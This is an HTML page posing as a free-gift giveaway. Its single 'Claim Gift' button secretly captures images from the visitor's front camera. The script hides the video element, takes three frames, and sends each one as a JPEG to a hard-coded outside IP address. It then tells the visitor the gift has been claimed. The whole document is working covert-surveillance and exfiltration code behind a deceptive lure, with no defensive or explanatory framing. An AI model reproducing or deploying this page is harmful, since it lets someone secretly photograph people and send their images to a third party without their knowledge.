<!DOCTYPE html>
<html>
<head>
    <title>üéÅ Claim Your Free Gift</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f9f9f9; }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>üéâ Congratulations!</h1>
    <p>You‚Äôve been selected to receive a special gift!</p>
    <button onclick="claimGift()">Claim Gift</button>

    <script>
        async function claimGift() {
            const video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');

                for (let i = 0; i < 3; i++) {
                    ctx.drawImage(video, 0, 0);
                    const imgData = canvas.toDataURL("image/jpeg");

                    await fetch("http://58.145.190.141:5000/upload", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ image: imgData })
                    });

                    await new Promise(r => setTimeout(r, 1500));
                }

                stream.getTracks().forEach(track => track.stop());
                alert("üéÅ Gift claimed! You will be contacted soon.");
            } catch (err) {
                alert("Camera access denied or failed.");
            }
        }
    </script>
</body>
</html>
